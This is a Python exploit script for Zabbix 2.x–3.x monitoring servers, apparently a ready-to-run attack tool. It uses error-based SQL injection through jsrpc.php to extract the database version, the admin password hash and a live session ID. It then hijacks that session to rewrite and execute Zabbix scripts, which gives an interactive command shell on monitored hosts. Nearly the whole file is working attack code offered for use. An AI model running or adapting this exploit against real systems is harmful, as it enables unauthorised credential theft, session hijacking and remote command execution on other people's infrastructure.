#!/usr/bin/env python
#coder:mickey

'''
Tcpdump Debug: tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'
'''

import re,sys,argparse,urllib2,json,readline
try:
	import requests
except Exception,e:
	sys.exit("\x1b[1;31m {-} This Exp need requests,please try 'pip install requests'\x1b[0m")
	
ugent = {'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27'}

def banner():
    print """\x1b[1;32m
  _____       _      _      _        ____                   
 |__  / __ _ | |__  | |__  (_)__  __|  _ \ __      __ _ __  
   / / / _` || '_ \ | '_ \ | |\ \/ /| |_) |\ \ /\ / /| '_ \ 
  / /_| (_| || |_) || |_) || | >  < |  __/  \ V  V / | | | |
 /____|\__,_||_.__/ |_.__/ |_|/_/\_\|_|      \_/\_/  |_| |_|
 
 Exploit for Zabbix 2.x - 3.x, coder by mickey: \x1b[0m""" 

def sql_injection(sql):
	data = { 'type'		: 9,
		 'method'	: 'screen.get',
		 'profileIdx'	: 1,
		 'updateProfile': 1,
		 'mode'		: 2,
		 'screenid'	: '',
		 'groupid'	: '',
		 'hostid'	: 0,
		 'pageFile'	: 1,
		 'action'	: 'showlatest',
		 'filter'	: '',
		 'filter_task'	: '',
		 'mark_color'	: 1,
		 'resourcetype' : 16,
		 'profileIdx2'  : sql
		}

	#payload = url +"jsrpc.php?type=9&method=screen.get&profileIdx=1&updateProfile=1&mode=2&screenid=&groupid=&hostid=0&pageFile=1&action=showlatest&filter=&filter_task=&mark_color=1&resourcetype=16&profileIdx2=" + urllib2.quote(sql)
	try:
		#response = urllib2.urlopen(payload,timeout=10).read()
		response = requests.post(url+'jsrpc.php',data=data,headers=ugent,verify=False)
	except Exception,msg:
		sys.exit("\x1b[1;31m{-}  %s\x1b[0m" % (str(msg)))
		
	else:
		result_re = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
		result = result_re.findall(response.text)
		if result:
			return result[0]

def check_version():
	req = requests.get(url+'/httpmon.php',headers=ugent,verify=False)
	version = re.findall('<a class="highlight".*?>(.*?Copyright.*?)<',req.text)
	if version != []:
		return version[0]
	else:
		return False

def check_sessionID(sessid):
	req = requests.get(url+'/proxies.php',headers=ugent,cookies={'zbx_sessionid':sessid},verify=False)
	if req.text.find('Access denied.') < 0:
		return  sessid
	else:
		sys.exit("\x1b[1;31m{-} zbx_sessionid(%s) is check Error \x1b[0m" % sessid)

def script_exec():
	pass

def api_jsonrpc_exec(authsession):
	#step1: get hostid
	data = { 'jsonrpc' : '2.0',
		 'method'  : 'host.get',
		 'params'  : {
			'output' : ["hostid","name"],
			'filter' : {'host'  : ''}
			     },
		 'auth'	   : authsession,
		 'id'	   : 1
		}
	ugent['Content-Type'] = 'application/json'
	hostid = requests.post(url+'api_jsonrpc.php',data=json.dumps(data),headers=ugent)
	hostid = hostid.json()
	print "\x1b[1;32m{+} HostUID           :  HostName      \x1b[0m"
	for hid in hostid['result']:
		print "\x1b[1;32m    %s     	      :  %s   \x1b[0m" % (hid['hostid'],hid['name'])

	#step2: update && execute
	
	hostid = raw_input('\033[41m[input_hostid]>>: \033[0m ')
	
	while True:
		cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
		if cmd == "" : print "Result of last comaand:"
		if cmd.lower() == "quit" or cmd.lower() == "exit": break

		payload = { 'jsonrpc'  : '2.0',
			    'method'   : 'script.update',
			    'params'   : {
				'scriptid' : '1',
				'command'  : ""+cmd+""
				},
			    'auth'     : authsession,
			    'id'       : 0,
			  }
		cmd_upd = requests.post(url+'api_jsonrpc.php',data=json.dumps(payload),headers=ugent)
		
                payload = { 'jsonrpc'  : '2.0',
                            'method'   : 'script.execute',
                            'params'   : {
                                'scriptid' : '1',
                                'hostid'  : hostid
                                },
                            'auth'     : authsession,
                            'id'       : 0,
                          }
		cmd_exe = requests.post(url+'api_jsonrpc.php',data=json.dumps(payload),headers=ugent)
		cmd_exec = cmd_exe.json()
		print cmd_exec["result"]["value"]



if __name__ == "__main__":
	parser = argparse.ArgumentParser(description=banner())
	parser.add_argument('--url',action="store",dest="url",type=str,required=True)
	given_args = parser.parse_args()
	url = given_args.url
	if url[-1] != '/': url += '/'
	mysql_version = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select version()),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
	mysql_user = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select user()),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
	zabbix_account = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
	zabbix_sessionid = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
	print
	print "\x1b[1;32m{+} MYSQL Version     :  %s\x1b[0m" % sql_injection(mysql_version)
	print "\x1b[1;32m{+} MYSQL User        :  %s\x1b[0m" % sql_injection(mysql_user)
	if check_version():
		print "\x1b[1;32m{+} Zabbix Version    :  %s\x1b[0m" % check_version()
	print "\x1b[1;32m{+} Zabbix Account    :  %s (md5)\x1b[0m" % sql_injection(zabbix_account)
	#print "\x1b[1;32m{+} Zabbix SessionID  :  %s \x1b[0m" % sql_injection(zabbix_sessionid)
	checkid = sql_injection(zabbix_sessionid)
	if check_sessionID(checkid):
		print "\x1b[1;32m{+} Zabbix SessionID  :  %s (check OK) \x1b[0m" % checkid
	api_jsonrpc_exec(checkid)